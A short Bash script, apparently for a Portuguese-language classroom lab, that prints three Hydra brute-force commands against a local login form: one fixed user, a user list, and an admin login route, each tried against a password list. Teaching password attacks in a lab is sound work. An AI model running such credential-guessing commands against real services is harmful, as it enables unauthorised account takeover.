#!/bin/bash
# Comandos Hydra de aula (lab). Ajuste ALVO/PORTA. Requer endpoint form ou fallback no backend (ver guia).
ALVO="127.0.0.1"
PORTA="8002"
echo "=== Nível 01 (usuário fixo) ==="
echo "hydra -l ana -P senhas.txt $ALVO -s $PORTA http-post-form \"/login:usuario=^USER^&senha=^PASS^:F=401\" -t 4 -V"
echo "=== Nível 02 (vários usuários) ==="
echo "hydra -L usuarios.txt -P senhas.txt $ALVO -s $PORTA http-post-form \"/login:usuario=^USER^&senha=^PASS^:F=401\" -t 4"
echo "=== Admin (rota /admin/login) ==="
echo "hydra -l admin -P senhas.txt $ALVO -s $PORTA http-post-form \"/admin/login:usuario=^USER^&senha=^PASS^:F=401\" -t 4 -V"
